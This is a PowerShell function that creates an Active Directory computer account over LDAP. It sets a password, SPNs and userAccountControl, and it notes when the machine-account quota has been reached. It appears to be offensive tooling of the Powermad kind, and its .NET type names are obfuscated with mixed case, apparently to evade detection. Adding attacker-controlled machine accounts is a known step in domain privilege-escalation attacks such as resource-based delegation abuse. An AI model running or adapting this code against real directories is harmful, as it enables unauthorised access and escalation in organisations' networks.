function New-Attribute
{

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$true)][String]$DN,
        [parameter(Mandatory=$true)][String]$D,
        [parameter(Mandatory=$true)][String]$CD,
        [parameter(Mandatory=$true)][String]$NewAcc,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    if($invalid_parameter)
    {
        Write-Output "$($invalid_parameter) is not a valid parameter"
        throw
    }

    $null = [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols")

    $P = Read-Host -Prompt "Enter a password" -AsSecureString
 

    $BSTR = [SyStEM.RuNtImE.InTeRoPSeRvIcEs.MaRsHaL]::SecureStringToBSTR($P)
    $clear = [SyStEM.RuNtImE.InTeRoPSeRvIcEs.MaRsHaL]::PtrToStringAuto($BSTR)
    
    $D = $D.ToLower()

    if($NewAcc.EndsWith('$'))
    {
        $SA = $NewAcc
        $NewAcc = $NewAcc.SubString(0,$NewAcc.Length - 1)
    }
    else 
    {
        $SA = $NewAcc + "$"
    }
   
    $clear = [System.Text.Encoding]::Unicode.GetBytes('"' + $clear + '"')

    $c = New-Object SyStEm.DiReCtOrYSeRVicEs.PRoToCoLs.LdApCONnECtiOn(New-Object SysTEM.DIReCTorySErvIces.PrOtocols.LdapDirectoryIdeNtifIEr($CD,389))

    
    $c.SessionOptions.Sealing = $true
    $c.SessionOptions.Signing = $true
    $c.Bind()
    $r = New-Object -TypeName SyStEM.DiRECtoRysERvIcES.PROTocoLs.ADdREQUest
    $r.DistinguishedName = $DN
    $r.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "unicodePwd",$clear)) > $null
    $r.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "SamAccountName",$SA)) > $null
    $r.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectClass","Computer")) > $null
    $r.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "ServicePrincipalName","HOST/$NewAcc.$D",
        "RestrictedKrbHost/$NewAcc.$D","HOST/$NewAcc","RestrictedKrbHost/$NewAcc")) > $null
    $r.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "userAccountControl","4096")) > $null
    $r.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "DnsHostName","$NewAcc.$D")) > $null

    
    Remove-Variable clear

    try
    {
        $c.SendRequest($r) > $null
        Write-Output "$SA added"
    }
    catch
    {
        Write-Output "[-] $($_.Exception.Message)"

        if($error_message -like '*Exception calling "SendRequest" with "1" argument(s): "The server cannot handle directory requests."*')
        {
            Write-Output "Maybe MAQ limit"
        }

    }

    if($directory_entry.Path)
    {
        $directory_entry.Close()
    }

}